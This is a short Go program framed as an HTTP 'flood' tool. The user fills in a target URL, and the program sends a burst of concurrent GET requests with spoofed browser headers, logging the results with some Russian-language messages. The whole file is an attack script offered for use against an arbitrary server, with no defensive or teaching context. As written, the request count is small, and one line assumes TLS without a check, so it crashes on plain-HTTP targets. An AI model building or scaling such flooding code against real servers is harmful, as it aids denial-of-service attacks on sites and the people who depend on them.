package main

import (
	"context"
	"crypto/tls"
	"fmt"
	"io"
	"net"
	"net/http"
	"sync"
	"time"
)

func main() {
	target := "" // your target 
	

	transport := &http.Transport{
		TLSClientConfig:   &tls.Config{InsecureSkipVerify: false},
		ForceAttemptHTTP2: true,

		MaxIdleConns:        1,
		MaxIdleConnsPerHost: 1,
		MaxConnsPerHost:     1,

		DialContext: (&net.Dialer{
			Timeout:   10 * time.Second,
			KeepAlive: 30 * time.Second,
		}).DialContext,
		IdleConnTimeout:     90 * time.Second,
		TLSHandshakeTimeout: 10 * time.Second,
	}

	client := &http.Client{
		Transport: transport,
		Timeout:   15 * time.Second,
	}

	headers := http.Header{
		"User-Agent":      {"Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0.0.0 Safari/537.36"},
		"Accept":          {"text/html,application/xhtml+xml;q=0.9,*/*;q=0.8"},
		"Accept-Language": {"en-US,en;q=0.9"},
		"Accept-Encoding": {"gzip, deflate, br"},
		"Connection":      {"keep-alive"},
	}

	var wg sync.WaitGroup

	fmt.Println("flood started to " + target)

	for i := 1; i < 20; i++ {
		wg.Add(1)
		go func(reqNum int) {
			defer wg.Done()

			ctx, cancel := context.WithTimeout(context.Background(), 10*time.Second)
			defer cancel()

			req, err := http.NewRequestWithContext(ctx, "GET", target, nil)
			if err != nil {
				fmt.Println("an error occured")
				return
			}

			req.Header = headers.Clone()

			start := time.Now()
			resp, err := client.Do(req)
			duration := time.Since(start)
			if err != nil {
				fmt.Printf("❌ [%02d] Ошибка запроса: %v\n", reqNum, err)
				return
			}

			defer resp.Body.Close()

			_, _ = io.Copy(io.Discard , resp.Body)

			fmt.Printf("✅ [%02d] %d | %s | %.0fms | Conn: %s\n", 
				reqNum, 
				resp.StatusCode, 
				resp.Proto,
				float64(duration.Milliseconds()),
				resp.TLS.ServerName,
			)
		}(i)

		time.Sleep(50 * time.Microsecond)
	}

	wg.Wait()
	fmt.Println("flood to " + target + " successfully finished")
}
